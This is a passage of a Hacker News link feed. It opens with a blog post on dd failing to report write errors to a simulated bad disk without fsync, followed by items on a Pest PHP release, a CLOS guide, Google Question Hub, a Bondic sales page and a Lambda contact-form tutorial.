after re-creating the device mapper target, i tried again. This time with the
following command:</p>

<figure><pre><code data-lang="bash"> <span>dd </span><span>if</span><span>=</span>/dev/zero <span>of</span><span>=</span>/dev/mapper/baddisk
 <span>dd</span>: writing to <span>'/dev/mapper/baddisk'</span>: Input/output error
 3096576 bytes <span>(</span>3.1 MB, 3.0 MiB<span>)</span> copied, 0.0238947 s, 130 MB/s</code></pre></figure>

<p>Nice, the device behaves as expected! While taking notes in another terminal
and switching back and forth workspaces, i issued the following command again:</p>

<figure><pre><code data-lang="bash">  <span>dd </span><span>if</span><span>=</span>/dev/zero <span>of</span><span>=</span>/dev/mapper/baddisk <span>bs</span><span>=</span>4096 <span>count</span><span>=</span>1000
  4096000 bytes <span>(</span>4.1 MB, 3.9 MiB<span>)</span> copied, 0.0107267 s, 382 MB/s</code></pre></figure>

<p>What? It succeeded writing <em>4.1MB</em> of data to a faulty segment of the disk
which should clearly fail! This was strange, but still, after many attempts
with this command writing to the complete device until it got end of space, no
I/O errors were reported by <em>dd</em>.</p>

<p>Looking at the <em>dmesg</em> output, the kernel correctly reported errors with the
underlying device:</p>

<figure><pre><code data-lang="bash"> Buffer I/O error on dev dm-3, logical block 757, lost async page write
 <span>[</span>..]</code></pre></figure>

<p>And running <em>badblocks</em> on the device also correctly reported them.</p>

<p><em>Why</em> does dd not report this error?</p>

<p>The difference between the commands is the used block size, so i assumed some
caching beeing the cause for this situation, or maybe dd opening the file with
different flags like O_DIRECT or O_SYNC if smaller block sizes are used?</p>

<p>I straced the <em>dd</em> command and the openat/write and close functions behaved
exacly the same, this time i used a <em>5MB</em> block size for simpler debugging:</p>

<figure><pre><code data-lang="bash"> openat<span>(</span>AT_FDCWD, <span>"/dev/mapper/baddisk"</span>, O_WRONLY|O_CREAT|O_TRUNC, 0666<span>)</span> <span>=</span> 3
 write<span>(</span>1, <span>"</span><span>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span>"</span>..., 5242880<span>)</span> <span>=</span> 5242880
 close<span>(</span>1<span>)</span>                                <span>=</span> 0</code></pre></figure>

<p>The strace output shows that the succeeding command opens the file without any
notable difference to the command writing with 512 bytes block size.  The write
and close functions return with no error whatsoever. <em>dd</em> simply does not
notice the data loss while writing to the storage!</p>

<p>Making <em>dd</em> use the <em>O_DIRECT</em> flag during file open, or the <em>O_SYNC</em> option
catches the error:</p>

<figure><pre><code data-lang="bash"> <span>dd </span><span>if</span><span>=</span>/dev/zero <span>of</span><span>=</span>/dev/mapper/baddisk <span>bs</span><span>=</span>5M <span>oflag</span><span>=</span>direct
 <span>dd</span>: error writing <span>'/dev/mapper/baddisk'</span>: Input/output error</code></pre></figure>

<p>What is the reason for this? I assume dd, with its standard block size of 512
bytes does not the hit the linux kernels buffered I/O. And with bigger block
sizes, the I/O becomes buffered, async, and as it stands, dd as user space
application does not validate the write operation (using fsync) to notice
errors during buffered I/O operations by default.</p>

<p>This leads us to my next finding: “the linux fsync() gate” that dates back to
2018, starting with the following question on stackoverflow:</p>

<p><a href="https://stackoverflow.com/questions/42434872/writing-programs-to-cope-with-i-o-errors-causing-lost-writes-on-linux">Writing programs to cope with I/O errors causing lost writes on Linux
</a></p>

<p>And resulting LWN articles:</p>

<p><a href="https://lwn.net/Articles/724307/">Improved block-layer error handling</a></p>

<p><a href="https://lwn.net/Articles/752063/">PostgreSQL’s fsync() surprise</a></p>

<p>which provide great insight into the linux kernels error handling and how these
errors are upstreamed to user space applications while writing data to faulty
devices.</p>

<p>Long story short: If one uses <em>dd</em> with a bigger block size <em>(&gt;= 4096)</em>, be
sure to use either the <em>oflag=direct</em> or <em>conv=fsync</em> option to have proper
error reporting while writing data to a device. I would prefer <em>conv=fsync</em>, dd
will then <em>fsync()</em> the file handle once and report the error, without having
the performance impact which <em>oflag=direct</em> has.</p>

<figure><pre><code data-lang="bash"><span>dd </span><span>if</span><span>=</span>/dev/zero <span>of</span><span>=</span>/dev/mapper/baddisk <span>bs</span><span>=</span>4096 <span>count</span><span>=</span>1500 <span>conv</span><span>=</span>fsync
<span>dd</span>: fsync failed <span>for</span> <span>'/dev/mapper/baddisk'</span>: Input/output error</code></pre></figure>


  </div></div>]]>
            </description>
            <link>https://abbbi.github.io/dd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668802</guid>
            <pubDate>Thu, 07 Jan 2021 08:50:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pest PHP v1.0 has been released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25668737">thread link</a>) | @nunomaduro
<br/>
January 7, 2021 | https://nunomaduro.com/pest-v1-released/ | <a href="https://web.archive.org/web/*/https://nunomaduro.com/pest-v1-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>After 400+ commits, 3 betas, seven months - and endless hours of open-source contributions - <a href="https://pestphp.com/"><strong>PEST</strong></a> has finally reached its first stable public release. 🥳</p><p>Of course, it would not have been possible without all the community support.</p><blockquote>No worries, upgrading to 1.0 takes 2 minutes: <a href="https://pestphp.com/docs/upgrade-guide"><strong>Upgrade Guide</strong></a>.</blockquote><p><strong>Pest is a Testing Framework</strong> with a focus on simplicity. It was carefully crafted to bring the joy of testing to PHP. Check the website: <a href="https://pestphp.com/"><strong>pestphp.com</strong></a>. While in beta, over seven months we released three beta versions before the stable v1.0 release:</p><p><strong>v0.1</strong> - May 20, 2020: PEST got open-sourced under the <a href="https://opensource.org/licenses/MIT">MIT license</a>. Besides the new elegant testing API with a focus on simplicity, it added a new testing output, coverage report in the terminal, higher-order testing, and more. The release got featured in important websites and newsletters such as <a href="https://laravel-news.com/pestphp-released-as-open-source">Laravel News</a>. Besides, <a href="https://twitter.com/michaeldyrynda">Michael Dyrynda</a> created a YouTube series called <a href="https://laravel-news.com/pestphp-video-series">Introducing PEST PHP</a>.</p><figure><a href="https://github.com/pestphp/pest"><div><p>pestphp/pest</p><p>Pest is an elegant PHP Testing Framework with a focus on simplicity - pestphp/pest</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://repository-images.githubusercontent.com/246674913/a1b60f80-9a3c-11ea-9740-7ff5bec21d98"></p></a></figure><p><strong>v0.2</strong> - Jun 14, 2020: PEST got a plugin API, and multiple plugins were added to the ecosystem: Laravel, Livewire, Faker, Snapshots, and more. Also, a <a href="https://laravel-news.com/pestphp-phpstorm">PHPStorm Plugin</a> was added and it got featured in the <a href="https://blog.jetbrains.com/phpstorm/2020/10/how-the-pest-phpstorm-plugin-will-improve-your-testing-workflow/">JetBrains Blog</a>. Also, PEST got covered in conference talks, including at Laracon EU: <a href="https://youtu.be/lEvau6CgqPE?t=125">Introducing PEST - Nuno Maduro</a>.</p><figure><iframe width="200" height="113" src="https://www.youtube.com/embed/lEvau6CgqPE?start=126&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p><strong>v0.3</strong> - Aug 27, 2020: PEST got the <a href="https://pestphp.com/docs/expectations">Expectation API</a>, a brand new documentation <a href="https://pestphp.com/docs/installation">website</a>, and enterprise sponsors <a href="https://scoutapm.com/">ScoutAPM</a> and <a href="https://akaunting.com/">Akaunting</a>. Meanwhile, PEST gathered a <a href="https://discord.com/invite/bMAJv82">Discord</a> community server with more than 350 people, 2k stars on <a href="https://github.com/pestphp/pest">Github</a>, and 220k downloads on <a href="https://packagist.org/packages/pestphp/pest">Packagist</a>.</p><figure><img src="https://nunomaduro.com/content/images/2021/01/Screenshot-2021-01-06-at-22.52.11.png"><figcaption>pestphp/pest install statistics</figcaption></figure><p><strong>v1.0</strong> - Jan 3, 2021: PEST got its first stable release, and hopefully a bright future. 🚀</p><p><strong>What’s next?</strong> As v1.0 usually suggests, PEST will stay stable for the foreseeable future and the library is ready for production use. Future development will focus more on learning resources such as videos, tutorials, and examples.</p><p><strong>Get involved!</strong> Pest is a community project, there are many <a href="https://github.com/pestphp">opportunities to contribute</a> to the whole ecosystem.</p><ul><li>Explore the docs: <a href="https://pestphp.com/"><strong>pestphp.com</strong> »</a></li><li>Follow us on Twitter: <a href="https://twitter.com/pestphp"><strong>@pestphp</strong> »</a></li><li>Join us on the Discord Server: <a href="https://discord.gg/bMAJv82"><strong>discord.gg/bMAJv82</strong> »</a></li></ul>
			</section></div>]]>
            </description>
            <link>https://nunomaduro.com/pest-v1-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668737</guid>
            <pubDate>Thu, 07 Jan 2021 08:41:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Brief Guide to CLOS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25668692">thread link</a>) | @Tomte
<br/>
January 7, 2021 | http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide.html | <a href="https://web.archive.org/web/*/http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<img src="http://www.n-a-n-o.com/lisp/cmucl-tutorials/prev.gif" alt="Previous">
<a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-1.html"><img src="http://www.n-a-n-o.com/lisp/cmucl-tutorials/next.gif" alt="Next"></a>
<img src="http://www.n-a-n-o.com/lisp/cmucl-tutorials/toc.gif" alt="Contents">
<hr>


<h2>Jeff Dalton, University of Edinburgh, &lt;J.Dalton@ed.ac.uk&gt;
         Modified by  Bruno Haible &lt;haible@ma2s2.mathematik.uni-karlsruhe.de&gt;
          and Peter Van Eynde &lt;s950045@uia.ua.ac.be&gt;</h2>
<h2><a name="toc1">1.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-1.html">Conventions </a></h2>

<h2><a name="toc2">2.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-2.html">Defining classes.</a></h2>

<h2><a name="toc3">3.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-3.html">Instances</a></h2>

<h2><a name="toc4">4.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-4.html">Inheritance of slot options</a></h2>

<h2><a name="toc5">5.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-5.html">Multiple inheritance</a></h2>

<h2><a name="toc6">6.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-6.html">Generic functions and methods</a></h2>

<h2><a name="toc7">7.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-7.html">Method combination.</a></h2>

<h2><a name="toc8">8.</a> <a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-8.html">Quick reference</a></h2>
<ul>
<li><a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-8.html#ss8.1">8.1 Defining a class</a>
</li><li><a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-8.html#ss8.2">8.2 Slot descriptions</a>
</li><li><a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-8.html#ss8.3">8.3 Making instances</a>
</li><li><a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-8.html#ss8.4">8.4 Method definitions</a>
</li><li><a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-8.html#ss8.5">8.5 Some functions</a>
</li></ul>


<hr>
<img src="http://www.n-a-n-o.com/lisp/cmucl-tutorials/prev.gif" alt="Previous">
<a href="http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide-1.html"><img src="http://www.n-a-n-o.com/lisp/cmucl-tutorials/next.gif" alt="Next"></a>
<img src="http://www.n-a-n-o.com/lisp/cmucl-tutorials/toc.gif" alt="Contents">


</div>]]>
            </description>
            <link>http://www.n-a-n-o.com/lisp/cmucl-tutorials/CLOS-guide.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668692</guid>
            <pubDate>Thu, 07 Jan 2021 08:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI Melody Generator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25668437">thread link</a>) | @rcarmo
<br/>
January 6, 2021 | https://dopeloop.ai/melody-generator/?s=9318976178695285&i=102 | <a href="https://web.archive.org/web/*/https://dopeloop.ai/melody-generator/?s=9318976178695285&i=102">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app">
      <div id="loader">
        <p><img src="https://dopeloop.ai/melody-generator/img/icon.png" id="logo"></p>
        
        <p>
          This app is a random midi melody generator which you can use to create melodies.
          The melodies are procedurally generated and are royalty free.
          You are free to download the midi files and use them in your own music.
        </p>
        <p><a href="https://dopeloop.ai/">get more music apps</a>
      </p></div>
    </div></div>]]>
            </description>
            <link>https://dopeloop.ai/melody-generator/?s=9318976178695285&amp;i=102</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668437</guid>
            <pubDate>Thu, 07 Jan 2021 07:53:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About tray: a casual personal space on the internet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25668423">thread link</a>) | @polm23
<br/>
January 6, 2021 | https://tray.club/@bgdotjpg/7946803587 | <a href="https://web.archive.org/web/*/https://tray.club/@bgdotjpg/7946803587">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://tray.club/@bgdotjpg/7946803587</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668423</guid>
            <pubDate>Thu, 07 Jan 2021 07:51:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google launches QuestionHub to tackle niche and long tail keywords]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25667807">thread link</a>) | @rukshn
<br/>
January 6, 2021 | https://ruky.me/2021/01/07/google-launches-question-hub-to-tackle-niche-and-long-tail-keyword-queries/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/07/google-launches-question-hub-to-tackle-niche-and-long-tail-keyword-queries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>You are able to find answers to almost all common questions on Google. But there are some areas where Google fails to provide good answers.</p>
<p>Personally or me when it comes to looking for an answer for a highly technical question in medicine, Google doesn’t do well in providing good answers.</p>
<p>Most of the results are not directing me to pages that I’m looking for, or they show me research articles that are not scientifically validates or are not included in the guidelines. So both occasions are not valuable for me.</p>
<p>But the answers can be found in text books if you can look hard enough. The answer is not available on Google not because that there is an answer, but because either no one has put the answer to the internet or not discovered by Google.</p>
<p>Yes, highly niche searches may not have a good market, because doctors and medical students looking for answers does not count for a huge traffic.</p>
<p><strong>But still if someone wants to build a good search engine, a good starting point maybe to look for a very niche field where Google is not performing well, and build on top of it.</strong></p>
<h2>QuestionHub by Google</h2>
<p>Google also maybe understanding the fact that that their systems and AI is not good enough to find answers to some highly specific questions or long tail keywords.</p>
<p><a rel="noreferrer noopener" href="https://questionhub.withgoogle.com/intl/en/" target="_blank">Question Hub by Google</a> is a service quietly launched by Google to improve their search engine when it comes to these non specific or highly specific questions, and long tail keywords .</p>
<figure><img data-attachment-id="143" data-permalink="https://ruky.me/2021/01/07/google-launches-question-hub-to-tackle-niche-and-long-tail-keyword-queries/img_0080/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?fit=2048%2C1536&amp;ssl=1" data-orig-size="2048,1536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_0080" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?fit=1024%2C768&amp;ssl=1" loading="lazy" width="1024" height="768" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=1024%2C768&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=1536%2C1152&amp;ssl=1 1536w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?w=2048&amp;ssl=1 2048w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=1536%2C1152&amp;ssl=1 1536w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?w=2048&amp;ssl=1 2048w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0080.png?resize=1024%2C768&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "><figcaption>Benefits of Question Hub according to Google</figcaption></figure>
<p>With Question Hub, Google is hoping to get help from people to improve their search experience for these kinds of queries.</p>
<p>Currently users from the USA, India, Nigeria, and Indonesia can contribute to Questions by Google. However, someone accessed the platform by using a VPN and shared this screenshot in one Facebook group.</p>
<figure><img data-attachment-id="142" data-permalink="https://ruky.me/2021/01/07/google-launches-question-hub-to-tackle-niche-and-long-tail-keyword-queries/img_0079/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?fit=1080%2C1920&amp;ssl=1" data-orig-size="1080,1920" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0079" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?fit=169%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?fit=576%2C1024&amp;ssl=1" loading="lazy" width="576" height="1024" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=576%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=576%2C1024&amp;ssl=1 576w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=169%2C300&amp;ssl=1 169w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=768%2C1365&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=864%2C1536&amp;ssl=1 864w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?w=1080&amp;ssl=1 1080w" sizes="(max-width: 576px) 100vw, 576px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=576%2C1024&amp;ssl=1 576w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=169%2C300&amp;ssl=1 169w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=768%2C1365&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=864%2C1536&amp;ssl=1 864w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?w=1080&amp;ssl=1 1080w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_0079.jpg?resize=576%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "><figcaption>Question Hub by Google</figcaption></figure>
<p>By looking at the screenshot, it appears that it’s a Quora like service, where people can add questions, and also contribute with answers and content.</p>
<p>People who rely on advertising can find commonly asked questions and and create content for it, and in turn get traffic and increase their ad revenue.</p>
<p>And Google can improve their knowledge graph and improve their service by providing a better service for its users.</p>
<p>It can be a win win situation for advertises, Google, users and content creators.</p>
<h2><strong>Downside</strong> </h2>
<p>Question Hub can have its shortcomings. For example, this can lead to more <strong>blog spam or SEO spam</strong>, because content creators can create spammy content for these questions.</p>
<p>Google also has a history of killing services once they achieved their targets (bait and switch). Who knows whether Google will do the same for their Question Hub platform, and kill it once they get enough information for their knowledge graph.</p>
<p>So what’s your idea about Question Hub? Can it lead to a better web?</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/07/google-launches-question-hub-to-tackle-niche-and-long-tail-keyword-queries/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25667807</guid>
            <pubDate>Thu, 07 Jan 2021 06:10:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bondic(tm) – Forget glue, this liquid plastic welder is 50X stronger]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25667598">thread link</a>) | @peter_d_sherman
<br/>
January 6, 2021 | https://now.getbondic.io/homepage/US/vsl-73-rv-oudintr/ | <a href="https://web.archive.org/web/*/https://now.getbondic.io/homepage/US/vsl-73-rv-oudintr/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<!-- End Facebook Pixel Code -->
<!-- Global site tag (gtag.js) - Google Ads: 721118076 -->


    



	

    <!--==========Preloader==========-->
    

    <!--==========Header==========-->
    

    <!--==========The Product==========-->
    <section id="product">
        
    </section>
    
       <section id="product2">
        
            </section>

    <!--==========The Product2==========-->
    <section id="product2">
        <div>
            
            <div>
                <p><img src="https://i.imgur.com/jyAllS4.png" width="600" alt=""></p><!--==========Feature Noted top right==========-->
                
                <!--==========Feature Noted top left==========-->
                
                <!--==========Feature Noted bottom right==========-->
                
                <!--==========Feature Noted bottom left==========-->
                
            </div>
        </div>
    </section>
    
 <section id="product2">
        
            </section>
            
             <!--==========How its Works==========-->
    <section>
        <div>
            
            <div>
                <!--==========Work Process==========-->
                <div>
                    <p><img src="https://i.imgur.com/BE80VMv.jpg" alt="">
                    </p>
                    <h3>Step 1</h3>
                    <p><strong>Sand the surface of the object you want to repair.</strong> Create a rough surface for a strong permanent bond.</p>
                </div>
                <!--==========Work Process==========-->
                <div data-wow-delay="0.5s">
                    <p><img src="https://i.imgur.com/pg7c4m2.jpg" alt="">
                    </p>
                    <h3>Step 2</h3>
                    <p><strong>Apply the liquid plastic to the desired area.</strong> Apply multiple layers for a strong bond.</p>
                </div>
                <!--==========Work Process==========-->
                <div data-wow-delay="1s">
                    <p><img src="https://i.imgur.com/uMkk2h6.jpg" alt="">
                    </p>
                    <h3>Step 3</h3>
                    <p><strong>Cure the liquid plastic with the UV light.</strong> It only takes 4 seconds before it gets as hard as a rock.</p>
                </div>
            </div>
        </div>
    </section>

            
            <section id="product2">
        
            </section>
            
            <section id="product2">
        </section>

       


    

    <!--==========The Benefits==========-->
    <section id="features">
        
    </section>

    <!--==========Get wonda==========-->
    <section>
        <div>
              <div>
                
                
                <ul>
                    <li data-wow-delay="0.2s"><strong>30-day money-back guarantee</strong></li>
                    <li data-wow-delay="0.4s"><strong>2-years warranty</strong></li>
                </ul>
            </div>
            
        </div>
    </section>

    <!--==========Reviews==========-->
    <section id="reviews">
        <div>
            
            <div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/LksiuA7.png" alt=""></p>
                    </div>
                    
                    <p>Received my Bondic kit yesterday and it has exceeded my expectations. I tested it on some bolts, a couple pieces of wood and metal, and it did a great job. Also, it’s very easy to use and cures in seconds.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/K7svOBo.png" alt=""></p>
                    </div>
                    
                    <p>Fast shipping and it comes in a nice little case! I’ve used it a couple times now and I have to admit that it’s a great alternative to glue.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/AnjZzN4.jpg" alt=""></p>
                    </div>
                    
                    <p>I’ve been using Bondic for the last couple months. I’ve used up the first tube for about 8-12 repairs and little projects which is pretty nice. But it all depends on the size of the object and the amount you use. I’ve already ordered an extra pack of refills with 50% off.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/AnjZzN4.jpg" alt=""></p>
                    </div>
                    
                    <p>I was a bit worried that this wouldn’t work for the project I’m working on, but it worked just fine! Using Bondic is easier and faster than glue.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/wfAFqRP.png" alt=""></p>
                    </div>
                    
                    <p>Mine came in a few weeks ago. Works fine! I’ve used it to repair and insulate a couple wires and I must say that I’m impressed. It’s cures superfast and it’s very easy to use. I definitely recommend this product.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/AjWYeWm.png" alt=""></p>
                    </div>
                    
                    <p>Works much better than superglue. It doesn’t make a mess and you can reposition the parts until you want to harden the repair and make it permanent. Also, it works right out of the box, so no need to buy batteries for the UV light.</p>
                </div>

             <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/AnjZzN4.jpg" alt=""></p>
                    </div>
                    
                    <p>This is perfect for crafts and repairs. It can do so much more than glue and it comes in a nice little box!</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/9iaFjIb.png" alt=""></p>
                    </div>
                    
                    <p>It works like a charm, but shipping was quite slow. It took more than 2 weeks.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/qb4gq6j.png" alt=""></p>
                    </div>
                    
                    <p>Bondic works fine, and I’m using it a lot! The repairs that I’ve done seem to be very strong and hold up nicely.</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/t1KqNv0.png" alt=""></p>
                    </div>
                    
                    <p>Bondic is a gamechanger! It cures in 4 seconds, doesn’t make a mess and it’s cheaper than most superglues. I would recommend it!</p>
                </div>
                <!--==========Review==========-->
                <div>
                    <div>
                        <p><img src="https://i.imgur.com/AnjZzN4.jpg" alt=""></p>
                    </div>
                    
                    <p>Great service and fast delivery! It’s just what I needed to finish my project. I’m 100% satisfied with the result thanks to Bondic.</p>
                </div>
               
            </div>
            
        </div>
    </section>

    <!--==========Footer==========-->
    

    <!--========== Javascript Files ==========-->
    <!-- jQuery Latest -->
    
    <!-- Bootstrap JS -->
    
    <!-- Plugins -->
    
    
    
    
    
    
    <!-- <script src="js/plugins/validate.js"></script> -->
    <!-- Includes -->
    <!-- <script src="js/includes/pre-order.js"></script> -->
    <!-- <script src="js/includes/subscribe.js"></script> -->
    <!-- <script src="js/includes/contact.js"></script> -->
    <!-- Main JS -->
    




</div>]]>
            </description>
            <link>https://now.getbondic.io/homepage/US/vsl-73-rv-oudintr/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25667598</guid>
            <pubDate>Thu, 07 Jan 2021 05:29:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: How to setup contact form on static page with Amazon Lambda]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25666891">thread link</a>) | @jpomykala
<br/>
January 6, 2021 | https://jpomykala.com/2018/08/04/serverless-contact-form-on-static-page | <a href="https://web.archive.org/web/*/https://jpomykala.com/2018/08/04/serverless-contact-form-on-static-page">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>If you are here I assume that you probably donâ€™t know PHP nor Wordpress, and so you decided to built a static web page or use some static
page generator like Jekyll, Grav or GatsbyJS. Right now your obvious option to provide ability to create a
contact from is using a <a href="https://formspree.io/">formspree.io</a> or something similar. Iâ€™m going to show you how to write your own contact form â€˜backendâ€™ in very short time.</p>
